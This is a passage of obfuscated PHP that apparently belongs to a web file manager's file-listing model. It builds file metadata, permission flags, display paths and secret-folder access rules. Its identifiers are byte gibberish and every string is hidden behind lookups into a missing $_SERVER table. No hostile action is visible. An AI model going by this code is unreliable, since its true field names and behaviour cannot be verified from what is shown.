$this->_listAppendFileMeta($çÍˆÊä, $æ‚ôÏÕ); $this->_listAppendChildren($çÍˆÊä, $æ‚ôÏÕ); } $this->_listAppendPath($çÍˆÊä); $this->_listAppendAuth($çÍˆÊä); $this->_listAppendSourceInfo($çÍˆÊä, $æ‚ôÏÕ); $this->_listAppendUser($çÍˆÊä); $this->_listFilterInfo($çÍˆÊä, $ÓÂÜ±Í¾); $this->_listAppendAuthSecret($çÍˆÊä); } protected function _listSourceCache($»ÈÂØü×) { $ıé™êÚ =& $_SERVER[åÄ¼Ùßš]; foreach ($»ÈÂØü× as $ëÆ¸¡”) { self::$cacheSourceInfo[$ıé™êÚ[544] . $ëÆ¸¡”[$ıé™êÚ[194]]] = $ëÆ¸¡”; } } protected function _listFilterInfo(&$¹Ğíúî´, $Õ‰ôÖ×Ô = false) { $ßª ÑœÒ =& $_SERVER[åÄ¼Ùßš]; foreach ($¹Ğíúî´ as &$¸—”ûâ) { $¸—”ûâ = $this->pathInfoFilter($¸—”ûâ); self::$cachePathInfo[$ßª ÑœÒ[545] . intval($Õ‰ôÖ×Ô) . $ßª ÑœÒ[474] . $¸—”ûâ[$ßª ÑœÒ[194]]] = $¸—”ûâ; } unset($¸—”ûâ); } protected function _listMake(&$“áëñ¤) { $É »ĞŒ² =& $_SERVER[åÄ¼Ùßš]; $“áëñ¤[$É »ĞŒ²[85]] = array(); $“áëñ¤[$É »ĞŒ²[86]] = array(); foreach ($“áëñ¤[$É »ĞŒ²[447]] as $¹»ªä÷­) { $›»¥şô = $¹»ªä÷­[$É »ĞŒ²[497]] == 1 ? $É »ĞŒ²[85] : $É »ĞŒ²[86]; $“áëñ¤[$›»¥şô][] = $¹»ªä÷­; } unset($“áëñ¤[$É »ĞŒ²[447]]); } protected function _listAppendMeta(&$ØÔš°œ’, $“È«àœÂ) { $ñéÚŠÛ´ =& $_SERVER[åÄ¼Ùßš]; $»ƒ“ÆûÜ = array($ñéÚŠÛ´[503] => array($ñéÚŠÛ´[504], $“È«àœÂ)); $½ì××¶Å = Model($ñéÚŠÛ´[546])->field($ñéÚŠÛ´[547])->where($»ƒ“ÆûÜ)->select(); if (!$½ì××¶Å) { return; } $ï±·ÊéĞ = array($ñéÚŠÛ´[548], $ñéÚŠÛ´[549], $ñéÚŠÛ´[528]); $öÕ»ÑßÌ = array(); foreach ($½ì××¶Å as $çíÑ ßú) { if (!isset($öÕ»ÑßÌ[$çíÑ ßú[$ñéÚŠÛ´[194]]])) { $öÕ»ÑßÌ[$çíÑ ßú[$ñéÚŠÛ´[194]]] = array(); } if (in_array($çíÑ ßú[$ñéÚŠÛ´[97]], $ï±·ÊéĞ)) { continue; } if ($çíÑ ßú[$ñéÚŠÛ´[97]] == $ñéÚŠÛ´[550]) { $çíÑ ßú[$ñéÚŠÛ´[452]] = $ñéÚŠÛ´[551]; } $öÕ»ÑßÌ[$çíÑ ßú[$ñéÚŠÛ´[194]]][$çíÑ ßú[$ñéÚŠÛ´[97]]] = $çíÑ ßú[$ñéÚŠÛ´[452]]; } foreach ($ØÔš°œ’ as &$‚’¾î¹İ) { $‚’¾î¹İ[$ñéÚŠÛ´[552]] = !1; if (isset($öÕ»ÑßÌ[$‚’¾î¹İ[$ñéÚŠÛ´[194]]])) { $‚’¾î¹İ[$ñéÚŠÛ´[552]] = $öÕ»ÑßÌ[$‚’¾î¹İ[$ñéÚŠÛ´[194]]]; } if ($this->fileIsLock($‚’¾î¹İ) && $‚’¾î¹İ[$ñéÚŠÛ´[499]]) { $é”û÷¶² = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‚’¾î¹İ[$ñéÚŠÛ´[499]][$ñéÚŠÛ´[500]] = AuthModel::authDisable($‚’¾î¹İ[$ñéÚŠÛ´[499]][$ñéÚŠÛ´[500]], $é”û÷¶²); $‚’¾î¹İ[$ñéÚŠÛ´[499]][$ñéÚŠÛ´[553]][$ñéÚŠÛ´[499]] = $‚’¾î¹İ[$ñéÚŠÛ´[499]][$ñéÚŠÛ´[500]]; } } unset($‚’¾î¹İ); } protected function _listAppendFileMeta(&$‹Ú«º®õ, $ûÕÖ»Û¾) { $İ†ˆÆ =& $_SERVER[åÄ¼Ùßš]; $íŒû¹ç© = array_to_keyvalue($‹Ú«º®õ, $İ†ˆÆ[12], $İ†ˆÆ[554]); $íŒû¹ç© = array_filter(array_unique($íŒû¹ç©)); $íŒû¹ç© = array_to_int($íŒû¹ç©); if (!$íŒû¹ç©) { return; } $“½ºó… = array($İ†ˆÆ[555] => array($İ†ˆÆ[504], $íŒû¹ç©)); $ŸÈŒñ— = $İ†ˆÆ[556]; $¹Ï‘¢Šë = Model($İ†ˆÆ[557])->field($ŸÈŒñ—)->where($“½ºó…)->select(); $¹Ï‘¢Šë = array_to_keyvalue($¹Ï‘¢Šë, $İ†ˆÆ[554]); $¥œš®©Ä = Model($İ†ˆÆ[558])->field($İ†ˆÆ[559])->where($“½ºó…)->select(); $¥œš®©Ä = $¥œš®©Ä ? $¥œš®©Ä : array(); $äÑœÒ¶û = array(); foreach ($¥œš®©Ä as $«Öú†¥) { if (!isset($äÑœÒ¶û[$«Öú†¥[$İ†ˆÆ[554]]])) { $äÑœÒ¶û[$«Öú†¥[$İ†ˆÆ[554]]] = array(); } $äÑœÒ¶û[$«Öú†¥[$İ†ˆÆ[554]]][$«Öú†¥[$İ†ˆÆ[97]]] = $«Öú†¥[$İ†ˆÆ[452]]; } foreach ($‹Ú«º®õ as &$‘ŒÃ¶½) { $µ ÖŞÆÃ = $‘ŒÃ¶½[$İ†ˆÆ[554]]; if (!$µ ÖŞÆÃ || !is_array($¹Ï‘¢Šë[$µ ÖŞÆÃ])) { continue; } $ØÕÉÙÏÎ = $¹Ï‘¢Šë[$µ ÖŞÆÃ]; $ØÕÉÙÏÎ[$İ†ˆÆ[79]] = $‘ŒÃ¶½[$İ†ˆÆ[79]]; $ØÕÉÙÏÎ[$İ†ˆÆ[32]] = $‘ŒÃ¶½[$İ†ˆÆ[32]]; if (!$ØÕÉÙÏÎ[$İ†ˆÆ[560]]) { Model($İ†ˆÆ[557])->fileMd5Check($ØÕÉÙÏÎ); } if (!isset(self::$cacheFileInfo[$İ†ˆÆ[561] . $µ ÖŞÆÃ])) { self::$cacheFileInfo[$İ†ˆÆ[561] . $µ ÖŞÆÃ] = array_merge(array(), $ØÕÉÙÏÎ); } unset($¹Ï‘¢Šë[$µ ÖŞÆÃ][$İ†ˆÆ[87]]); $À¢æ’Ï¬ = isset($äÑœÒ¶û[$µ ÖŞÆÃ]) && is_array($äÑœÒ¶û[$µ ÖŞÆÃ]) ? $äÑœÒ¶û[$µ ÖŞÆÃ] : array(); $‘ŒÃ¶½[$İ†ˆÆ[170]] = array_merge($À¢æ’Ï¬, $¹Ï‘¢Šë[$µ ÖŞÆÃ]); if (isset($‘ŒÃ¶½[$İ†ˆÆ[170]][$İ†ˆÆ[185]])) { $‘ŒÃ¶½[$İ†ˆÆ[185]] = json_decode($‘ŒÃ¶½[$İ†ˆÆ[170]][$İ†ˆÆ[185]], !0); unset($‘ŒÃ¶½[$İ†ˆÆ[170]][$İ†ˆÆ[185]]); } } unset($‘ŒÃ¶½); } protected function _listAppendSourceInfo(&$ÅñÒÌ·™, $ø‡ºÕ¯Ê) { $ğ”—×÷ =& $_SERVER[åÄ¼Ùßš]; $ÚƒåÊ»Ô = Model($ğ”—×÷[562])->listData(); $Íßšø±ˆ = Model($ğ”—×÷[511])->listData(); $–Ûå¢¿Å = Model($ğ”—×÷[501])->listData(); $•Ç€ÄÑŠ = Model($ğ”—×÷[563])->listSimple(); $•ÍØ¶· = array_to_keyvalue($ÚƒåÊ»Ô, $ğ”—×÷[484]); $’¯˜â¥Ú = array_to_keyvalue_group($Íßšø±ˆ, $ğ”—×÷[87], $ğ”—×÷[512]); $Ø†®åĞ = array_to_keyvalue($–Ûå¢¿Å, $ğ”—×÷[87]); $—’©ãÛ© = array_to_keyvalue_group($•Ç€ÄÑŠ, $ğ”—×÷[194]); foreach ($ÅñÒÌ·™ as &$éÁ’»óÌ) { $éÁ’»óÌ[$ğ”—×÷[90]] = array($ğ”—×÷[564] => 0, $ğ”—×÷[565] => 0, $ğ”—×÷[566] => 0); if (isset($Ø†®åĞ[$éÁ’»óÌ[$ğ”—×÷[194]]])) { $éÁ’»óÌ[$ğ”—×÷[90]][$ğ”—×÷[567]] = 1; $éÁ’»óÌ[$ğ”—×÷[90]][$ğ”—×÷[568]] = $Ø†®åĞ[$éÁ’»óÌ[$ğ”—×÷[194]]][$ğ”—×÷[32]]; } if ($’¯˜â¥Ú && $•ÍØ¶· && isset($’¯˜â¥Ú[$éÁ’»óÌ[$ğ”—×÷[194]]])) { $éÁ’»óÌ[$ğ”—×÷[90]][$ğ”—×÷[569]] = array(); foreach ($’¯˜â¥Ú[$éÁ’»óÌ[$ğ”—×÷[194]]] as $Ë‹¾«¢Ñ) { $Å‡Š¤ã = $•ÍØ¶·[$Ë‹¾«¢Ñ]; $éÁ’»óÌ[$ğ”—×÷[90]][$ğ”—×÷[569]][] = array($ğ”—×÷[570] => $Å‡Š¤ã[$ğ”—×÷[484]], $ğ”—×÷[506] => $Å‡Š¤ã[$ğ”—×÷[32]], $ğ”—×÷[571] => $Å‡Š¤ã[$ğ”—×÷[572]]); } } if ($—’©ãÛ© && isset($—’©ãÛ©[$éÁ’»óÌ[$ğ”—×÷[194]]])) { $éÁ’»óÌ[$ğ”—×÷[90]][$ğ”—×÷[573]] = array(); foreach ($—’©ãÛ©[$éÁ’»óÌ[$ğ”—×÷[194]]] as $¯‡ãàÚÔ) { $¹—ßøÈ = $ğ”—×÷[574]; if ($¯‡ãàÚÔ[$ğ”—×÷[575]] == $ğ”—×÷[91]) { $¹—ßøÈ .= $ğ”—×÷[576]; } $éÁ’»óÌ[$ğ”—×÷[90]][$ğ”—×÷[573]] = array_field_key($¯‡ãàÚÔ, explode($ğ”—×÷[50], $¹—ßøÈ)); } } } unset($éÁ’»óÌ); return $ÅñÒÌ·™; } protected function _listAppendChildren(&$™©ñå©, $¨¥“Æ‘¿) { $Ñ¸©™³å =& $_SERVER[åÄ¼Ùßš]; $àú¼½×õ = array(); $ÙÁ¡÷Ä = array($Ñ¸©™³å[242] => 0, $Ñ¸©™³å[243] => 0); foreach ($™©ñå© as &$›ª±ò±ã) { if (!$›ª±ò±ã[$Ñ¸©™³å[497]]) { continue; } $àú¼½×õ[] = intval($›ª±ò±ã[$Ñ¸©™³å[194]]); } unset($›ª±ò±ã); if (!$àú¼½×õ) { return; } $•º³¾ªş = array($Ñ¸©™³å[193] => array($Ñ¸©™³å[7], $àú¼½×õ), $Ñ¸©™³å[517] => 0); $À¡†ƒÙ  = array($Ñ¸©™³å[193], $Ñ¸©™³å[497], $Ñ¸©™³å[577] => $Ñ¸©™³å[578]); $ó—“ŸÑù = $this->field($À¡†ƒÙ )->where($•º³¾ªş)->group($Ñ¸©™³å[579])->select(); $Ì»ïğ¹Û = array(); foreach ($ó—“ŸÑù as $ˆ–§®›è) { $şÖ×Ø = $ˆ–§®›è[$Ñ¸©™³å[193]]; $†¸˜³êı = $ˆ–§®›è[$Ñ¸©™³å[497]] == $Ñ¸©™³å[91] ? $Ñ¸©™³å[243] : $Ñ¸©™³å[242]; if (!isset($Ì»ïğ¹Û[$şÖ×Ø])) { $Ì»ïğ¹Û[$şÖ×Ø] = array($Ñ¸©™³å[242] => 0, $Ñ¸©™³å[243] => 0); } $Ì»ïğ¹Û[$şÖ×Ø][$†¸˜³êı] += $ˆ–§®›è[$Ñ¸©™³å[578]]; } foreach ($™©ñå© as &$›ª±ò±ã) { if (!$›ª±ò±ã[$Ñ¸©™³å[497]]) { continue; } $·ŒéŒŞ = is_array($Ì»ïğ¹Û[$›ª±ò±ã[$Ñ¸©™³å[194]]]) ? $Ì»ïğ¹Û[$›ª±ò±ã[$Ñ¸©™³å[194]]] : $ÙÁ¡÷Ä; $›ª±ò±ã[$Ñ¸©™³å[243]] = $·ŒéŒŞ[$Ñ¸©™³å[243]]; $›ª±ò±ã[$Ñ¸©™³å[242]] = $·ŒéŒŞ[$Ñ¸©™³å[242]]; unset($›ª±ò±ã[$Ñ¸©™³å[498]]); } unset($›ª±ò±ã); } protected function _listAppendAuth(&$şšßÉ±) { $¤‚é‡Æ =& $_SERVER[åÄ¼Ùßš]; $»àÀŸ€é = array(); foreach ($şšßÉ± as $ŞÉÆç ¿) { if ($ŞÉÆç ¿[$¤‚é‡Æ[191]] == self::TYPE_GROUP) { $»àÀŸ€é[] = intval($ŞÉÆç ¿[$¤‚é‡Æ[194]]); } } if (!$»àÀŸ€é) { return; } $‹—‰ÎˆŠ = array_to_keyvalue($şšßÉ±, $¤‚é‡Æ[194]); $ä±Ç«Í = Model($¤‚é‡Æ[580])->getSourceList($»àÀŸ€é, $‹—‰ÎˆŠ); $ó®“ĞåÍ = KodUser::isRoot(); foreach ($şšßÉ± as $ü§‡ÀÁ => &$ŞÉÆç ¿) { $ŞÉÆç ¿[$¤‚é‡Æ[499]] = $ä±Ç«Í[$ŞÉÆç ¿[$¤‚é‡Æ[194]]]; if (!$ŞÉÆç ¿[$¤‚é‡Æ[499]] && $ŞÉÆç ¿[$¤‚é‡Æ[191]] == self::TYPE_GROUP) { $ŞÉÆç ¿[$¤‚é‡Æ[499]] = Action($¤‚é‡Æ[581])->pathGroupAuthMake($ŞÉÆç ¿[$¤‚é‡Æ[582]]); if (!$ŞÉÆç ¿[$¤‚é‡Æ[499]] && !$ó®“ĞåÍ) { $ŞÉÆç ¿[$¤‚é‡Æ[236]] = !1; $ŞÉÆç ¿[$¤‚é‡Æ[235]] = !1; } } if ($ŞÉÆç ¿[$¤‚é‡Æ[499]]) { $ŞÉÆç ¿[$¤‚é‡Æ[236]] = AuthModel::authCheckEdit($ŞÉÆç ¿[$¤‚é‡Æ[499]][$¤‚é‡Æ[500]]); $ŞÉÆç ¿[$¤‚é‡Æ[235]] = AuthModel::authCheckView($ŞÉÆç ¿[$¤‚é‡Æ[499]][$¤‚é‡Æ[500]]); } $this->groupPathDisplay($ŞÉÆç ¿); } unset($ŞÉÆç ¿); } public function _listAppendAuthSecret(&$Ñåö†¼¦) { $úîøòš˜ =& $_SERVER[åÄ¼Ùßš]; if (Model($úîøòš˜[519])->get($úîøòš˜[583]) != $úîøòš˜[91]) { return; } static $¾Èü°·Œ = false; if (!$¾Èü°·Œ) { $³Î”æä° = Model($úîøòš˜[584]); $²ô—Ğ¼ = Model($úîøòš˜[585]); $¾Èü°·Œ = $²ô—Ğ¼->listData(); $¾Èü°·Œ = array_to_keyvalue($¾Èü°·Œ, $úîøòš˜[194]); $ş•—ğµ = json_decode(Model($úîøòš˜[519])->get($úîøòš˜[586]), !0); $ş•—ğµ = array_to_keyvalue($ş•—ğµ, $úîøòš˜[484]); foreach ($¾Èü°·Œ as $­ùÔ¶ò => $µà¿ËÑ¦) { $ìì˜±ç = $ş•—ğµ[$µà¿ËÑ¦[$úîøòš˜[587]]]; if (!$ìì˜±ç) { $²ô—Ğ¼->remove($µà¿ËÑ¦[$úîøòš˜[484]]); unset($¾Èü°·Œ[$­ùÔ¶ò]); continue; } $‹şÍø› = $³Î”æä°->listData($ìì˜±ç[$úîøòš˜[499]]); if (!$‹şÍø›) { $²ô—Ğ¼->remove($µà¿ËÑ¦[$úîøòš˜[484]]); unset($¾Èü°·Œ[$­ùÔ¶ò]); continue; } $µà¿ËÑ¦[$úîøòš˜[499]] = $‹şÍø›; $µà¿ËÑ¦[$úîøòš˜[588]] = $ìì˜±ç; $µà¿ËÑ¦[$úîøòš˜[589]] = Model($úîøòš˜[590])->getInfoSimpleOuter($µà¿ËÑ¦[$úîøòš˜[538]]); $¾Èü°·Œ[$­ùÔ¶ò] = $µà¿ËÑ¦; } } $ïËâˆÊó = USER_ID; $“‚öôè = array(); $´®µ«Á§ = $this->_listAppendPath($“‚öôè, !0); foreach ($Ñåö†¼¦ as $­ùÔ¶ò => &$µà¿ËÑ¦) { if (!is_array($µà¿ËÑ¦[$úîøòš˜[499]])) { continue; } if ($µà¿ËÑ¦[$úîøòš˜[191]] != $úîøòš˜[591]) { continue; } if (isset($¾Èü°·Œ[$µà¿ËÑ¦[$úîøòš˜[194]]])) { $¤‘¸²‘ = $¾Èü°·Œ[$µà¿ËÑ¦[$úîøòš˜[194]]]; if (!is_array($µà¿ËÑ¦[$úîøòš˜[552]])) { $µà¿ËÑ¦[$úîøòš˜[552]] = array(); } $µà¿ËÑ¦[$úîøòš˜[552]][$úîøòš˜[592]] = $¤‘¸²‘[$úîøòš˜[587]]; $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[593]] = $¤‘¸²‘; $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[594]] = $µà¿ËÑ¦[$úîøòš˜[595]]; $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[596]] = $úîøòš˜[91]; if ($¤‘¸²‘[$úîøòš˜[538]] != $ïËâˆÊó) { $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[500]] = $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[500]] & $¤‘¸²‘[$úîøòš˜[499]][$úîøòš˜[499]]; } continue; } $«æ·ñ­Û = $this->parentLevelArray($µà¿ËÑ¦[$úîøòš˜[597]]); $•ÙÆÖ¨ì = array_reverse($«æ·ñ­Û); foreach ($•ÙÆÖ¨ì as $ºì¼ÄÕŞ => $¹ÏÕó®) { if (!isset($¾Èü°·Œ[$¹ÏÕó®])) { continue; } $¤‘¸²‘ = $¾Èü°·Œ[$¹ÏÕó®]; $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[593]] = $¤‘¸²‘; if ($¤‘¸²‘[$úîøòš˜[538]] != $ïËâˆÊó) { $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[500]] = $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[500]] & $¤‘¸²‘[$úîøòš˜[499]][$úîøòš˜[499]]; } $÷È˜È¡ = $úîøòš˜[12]; $˜Ÿòš…˜ = count($«æ·ñ­Û) - $ºì¼ÄÕŞ; for ($ûÁÎ¸²û = 0; $ûÁÎ¸²û < $˜Ÿòš…˜; $ûÁÎ¸²û++) { if (!isset($´®µ«Á§[$«æ·ñ­Û[$ûÁÎ¸²û]])) { $÷È˜È¡ = $úîøòš˜[12]; break; } $÷È˜È¡ = $÷È˜È¡ . rtrim($´®µ«Á§[$«æ·ñ­Û[$ûÁÎ¸²û]], $úîøòš˜[8]) . $úîøòš˜[8]; } $µà¿ËÑ¦[$úîøòš˜[499]][$úîøòš˜[594]] = rtrim($÷È˜È¡, $úîøòš˜[8]) . $úîøòš˜[8]; break; } } unset($µà¿ËÑ¦); } public function groupPathDisplay(&$æäëš¡Â) { $‡à‹ÄÚ¸ =& $_SERVER[åÄ¼Ùßš]; if ($æäëš¡Â[$‡à‹ÄÚ¸[191]] != self::TYPE_GROUP) { return; } $èËÀ’È„ = Model($‡à‹ÄÚ¸[598])->getInfo($æäëš¡Â[$‡à‹ÄÚ¸[582]]); $›ÕùŞÓñ = $this->parentLevelArray($èËÀ’È„[$‡à‹ÄÚ¸[597]]); $ì÷šÂ³ë = $‡à‹ÄÚ¸[12]; foreach ($›ÕùŞÓñ as $£›¬Ä«) { $Ë¨íÖô = Model($‡à‹ÄÚ¸[598])->getInfo($£›¬Ä«); $ì÷šÂ³ë .= $Ë¨íÖô[$‡à‹ÄÚ¸[90]][$‡à‹ÄÚ¸[194]] . $‡à‹ÄÚ¸[50]; } $æäëš¡Â[$‡à‹ÄÚ¸[599]] = $èËÀ’È„[$‡à‹ÄÚ¸[193]]; $æäëš¡Â[$‡à‹ÄÚ¸[600]] = $èËÀ’È„[$‡à‹ÄÚ¸[597]]; $æäëš¡Â[$‡à‹ÄÚ¸[601]] = $èËÀ’È„[$‡à‹ÄÚ¸[602]]; $æäëš¡Â[$‡à‹ÄÚ¸[603]] = $ì÷šÂ³ë . $èËÀ’È„[$‡à‹ÄÚ¸[90]][$‡à‹ÄÚ¸[194]]; } protected function _listAppendPath(&$ı÷´©ˆ, $½·ÌÛüğ = false) { $ü”ÏŒº¯ =& $_SERVER[åÄ¼Ùßš]; static $ª„˜ƒÓõ = array(); $­†‘† = array(); $²úÔ»‘ = array(); if ($½·ÌÛüğ) { return $ª„˜ƒÓõ; } foreach ($ı÷´©ˆ as &$°ö¤ïã) { $åâëûÁ = $°ö¤ïã[$ü”ÏŒº¯[194]]; if ($°ö¤ïã[$ü”ÏŒº¯[497]] == $ü”ÏŒº¯[91] && $°ö¤ïã[$ü”ÏŒº¯[193]] != 0) { $ª„˜ƒÓõ[$åâëûÁ] = $°ö¤ïã[$ü”ÏŒº¯[32]]; } if ($°ö¤ïã[$ü”ÏŒº¯[497]] == $ü”ÏŒº¯[91] && $°ö¤ïã[$ü”ÏŒº¯[193]] == 0) { $ª„˜ƒÓõ[$åâëûÁ] = $this->_listAppendPathRoot($°ö¤ïã, array()); } if (isset($²úÔ»‘[$°ö¤ïã[$ü”ÏŒº¯[597]]])) { continue; } $²úÔ»‘[$°ö¤ïã[$ü”ÏŒº¯[597]]] = !0; $¿ê›¸»Õ = $this->parentLevelArray($°ö¤ïã[$ü”ÏŒº¯[597]]); foreach ($¿ê›¸»Õ as $ˆ¨Â­à => $šù„ˆ­ˆ) { if (isset($ª„˜ƒÓõ[$šù„ˆ­ˆ])) { continue; } if ($ˆ¨Â­à == 0) { $ª„˜ƒÓõ[$šù„ˆ­ˆ] = $this->_listAppendPathRoot($°ö¤ïã, $¿ê›¸»Õ); } if ($ˆ¨Â­à != 0) { $­†‘†[] = $šù„ˆ­ˆ; } } } unset($°ö¤ïã); $­†‘† = array_unique($­†‘†); if (count($­†‘†) > 0) { $¼º¿†­Ø = array($ü”ÏŒº¯[503] => array($ü”ÏŒº¯[504], $­†‘†)); if (count($­†‘†) == 1) { $«†İ§Éİ = $this->sourceInfo($­†‘†[0]); $Ø—•‡¤Ø = is_array($«†İ§Éİ) ? array($«†İ§Éİ) : !1; } else { $Ø—•‡¤Ø = $this->field($ü”ÏŒº¯[604])->where($¼º¿†­Ø)->select(); } if (!$Ø—•‡¤Ø) { $Ø—•‡¤Ø = array(); } foreach ($Ø—•‡¤Ø as $Ê´†ó×Ñ) { $ª„˜ƒÓõ[$Ê´†ó×Ñ[$ü”ÏŒº¯[194]]] = $Ê´†ó×Ñ[$ü”ÏŒº¯[32]]; } } $æ£òöË¯ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ïç»ÇÖ• = array(); foreach ($ı÷´©ˆ as &$°ö¤ïã) { $±‚¤Õ  = $°ö¤ïã[$ü”ÏŒº¯[597]]; $ŸµŸìŠó = $ü”ÏŒº¯[12]; if (isset($Ïç»ÇÖ•[$±‚¤Õ ])) { $ŸµŸìŠó = $Ïç»ÇÖ•[$±‚¤Õ ]; } else { $¿ê›¸»Õ = $this->parentLevelArray($°ö¤ïã[$ü”ÏŒº¯[597]]); foreach ($¿ê›¸»Õ as $ˆ¨Â­à => $šù„ˆ­ˆ) { if (isset($ª„˜ƒÓõ[$šù„ˆ­ˆ])) { $ŸµŸìŠó .= $ª„˜ƒÓõ[$šù„ˆ­ˆ] . $ü”ÏŒº¯[8]; } } $Ïç»ÇÖ•[$±‚¤Õ ] = $ŸµŸìŠó; } $ŸµŸìŠó .= $°ö¤ïã[$ü”ÏŒº¯[32]]; if ($°ö¤ïã[$ü”ÏŒº¯[497]] == $ü”ÏŒº¯[91]) { $ŸµŸìŠó .= $ü”ÏŒº¯[8]; } $°ö¤ïã[$ü”ÏŒº¯[595]] = str_replace($ü”ÏŒº¯[257], $ü”ÏŒº¯[8], $ŸµŸìŠó); if ($°ö¤ïã[$ü”ÏŒº¯[193]] == $ü”ÏŒº¯[231]) { $°ö¤ïã[$ü”ÏŒº¯[32]] = trim($ª„˜ƒÓõ[$°ö¤ïã[$ü”ÏŒº¯[194]]], $ü”ÏŒº¯[8]); $°ö¤ïã[$ü”ÏŒº¯[595]] = $°ö¤ïã[$ü”ÏŒº¯[32]] . $ü”ÏŒº¯[8]; } if (intval($°ö¤ïã[$ü”ÏŒº¯[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($°ö¤ïã, $¿ê›¸»Õ, $æ£òöË¯); } } unset($°ö¤ïã); return $ı÷´©ˆ; } private function _listAppendPathRecycle(&$àƒ—Òåé, $ÊÙºî­, $Ë¶¿‰½ƒ) { $ğïâ¢Á =& $_SERVER[åÄ¼Ùßš]; if (!in_array($Ë¶¿‰½ƒ, $ÊÙºî­) && $àƒ—Òåé[$ğïâ¢Á[194]] != $Ë¶¿‰½ƒ) { return; } $Ö€ÏÒ¦Î = explode($ğïâ¢Á[8], trim($àƒ—Òåé[$ğïâ¢Á[595]], $ğïâ¢Á[8])); $—ê×òî‹ = implode($ğïâ¢Á[8], array_slice($Ö€ÏÒ¦Î, 2)); $àƒ—Òåé[$ğïâ¢Á[595]] = $ğïâ¢Á[8] . LNG($ğïâ¢Á[605]) . $ğïâ¢Á[8] . ltrim($—ê×òî‹, $ğïâ¢Á[8]); $àƒ—Òåé[$ğïâ¢Á[597]] = $ğïâ¢Á[606] . implode($ğïâ¢Á[50], array_slice($ÊÙºî­, 1)) . $ğïâ¢Á[50]; if ($àƒ—Òåé[$ğïâ¢Á[194]] == $Ë¶¿‰½ƒ) { $àƒ—Òåé[$ğïâ¢Á[597]] = $ğïâ¢Á[606]; $àƒ—Òåé[$ğïâ¢Á[193]] = $ğïâ¢Á[231]; $àƒ—Òåé[$ğïâ¢Á[32]] = LNG($ğïâ¢Á[605]); } $àƒ—Òåé[$ğïâ¢Á[607]] = $ğïâ¢Á[608]; } protected function _listAppendPathRoot(&$ûª±ûË‡, $ëòÍøáí) { $Ô“é§ =& $_SERVER[åÄ¼Ùßš]; static $ÏÍşß’ = false; static $Ëò€í§¾ = false; $ÂÛÊïå€ = $Ô“é§[12]; if ($ûª±ûË‡[$Ô“é§[191]] == self::TYPE_USER) { if ($ûª±ûË‡[$Ô“é§[582]] == USER_ID) { $ÂÛÊïå€ = LNG($Ô“é§[609]); if ($ÏÍşß’ === !1) { $ö¸ç¶ë‚ = Model($Ô“é§[610])->getInfoFull(USER_ID); $ÏÍşß’ = _get($ö¸ç¶ë‚, $Ô“é§[611], $Ô“é§[12]); } if ($Ëò€í§¾ === !1) { $ö¸ç¶ë‚ = Model($Ô“é§[610])->getInfoFull(USER_ID); $Ëò€í§¾ = _get($ö¸ç¶ë‚, $Ô“é§[612], $Ô“é§[12]); } if ($ëòÍøáí && $ëòÍøáí[0] == $ÏÍşß’ || !$ëòÍøáí && $ûª±ûË‡[$Ô“é§[194]] == $ÏÍşß’) { $ÂÛÊïå€ = LNG($Ô“é§[613]); $ûª±ûË‡[$Ô“é§[614]] = $Ô“é§[615]; } if ($ëòÍøáí && $ëòÍøáí[0] == $Ëò€í§¾ || !$ëòÍøáí && $ûª±ûË‡[$Ô“é§[194]] == $Ëò€í§¾) { $ÂÛÊïå€ = $ÂÛÊïå€ . $Ô“é§[616] . LNG($Ô“é§[617]); } if (!$ëòÍøáí) { $ûª±ûË‡[$Ô“é§[32]] = $ÂÛÊïå€; } } else { $ö¸ç¶ë‚ = Model($Ô“é§[610])->getInfoFull($ûª±ûË‡[$Ô“é§[582]]); $ğÁåÛàÑ = _get($ö¸ç¶ë‚, $Ô“é§[612], $Ô“é§[12]); $ûª±ûË‡[$Ô“é§[618]] = Model($Ô“é§[590])->getInfoSimpleOuter($ûª±ûË‡[$Ô“é§[582]]); $ÂÛÊïå€ = LNG($Ô“é§[619]) . $Ô“é§[176] . $ûª±ûË‡[$Ô“é§[618]][$Ô“é§[32]] . $Ô“é§[178]; if ($ëòÍøáí && $ëòÍøáí[0] == $ğÁåÛàÑ || !$ëòÍøáí && $ûª±ûË‡[$Ô“é§[194]] == $ğÁåÛàÑ) { $ÂÛÊïå€ = LNG($Ô“é§[619]) . $Ô“é§[620] . $ûª±ûË‡[$Ô“é§[618]][$Ô“é§[32]] . $Ô“é§[616] . LNG($Ô“é§[617]) . $Ô“é§[178]; } } } else { if ($ûª±ûË‡[$Ô“é§[191]] == self::TYPE_GROUP) { $×’«ê–Ñ = Model($Ô“é§[598])->getInfoSimple($ûª±ûË‡[$Ô“é§[582]]); $ÂÛÊïå€ = $×’«ê–Ñ[$Ô“é§[32]]; } else { if ($ûª±ûË‡[$Ô“é§[191]] == self::TYPE_SYSTEM) { $ÂÛÊïå€ = $Ô“é§[621]; } } } $ÂÛÊïå€ = $ÂÛÊïå€ ? $Ô“é§[8] . $ÂÛÊïå€ . $Ô“é§[8] : $Ô“é§[8]; return $ÂÛÊïå€; } protected function _listAppendUser(&$‚ÏòúûÙ) { $¹öØïìÛ =& $_SERVER[åÄ¼Ùßš]; $ßˆÊ¤ÙŞ = array_to_keyvalue($‚ÏòúûÙ, $¹öØïìÛ[12], $¹öØïìÛ[538]); $ÑóüÄü¼ = array_to_keyvalue($‚ÏòúûÙ, $¹öØïìÛ[12], $¹öØïìÛ[540]); $ş£ÂÇß = array_merge($ßˆÊ¤ÙŞ, $ÑóüÄü¼); $íœÃªûµ = Model($¹öØïìÛ[610])->userListInfo($ş£ÂÇß); foreach ($‚ÏòúûÙ as &$¤ç™ù»¸) { $ÃèÊ¯ôï = $¤ç™ù»¸[$¹öØïìÛ[538]]; $¤ç™ù»¸[$¹öØïìÛ[538]] = $íœÃªûµ[$ÃèÊ¯ôï] ? $íœÃªûµ[$ÃèÊ¯ôï] : !1; $ÃèÊ¯ôï = $¤ç™ù»¸[$¹öØïìÛ[540]]; 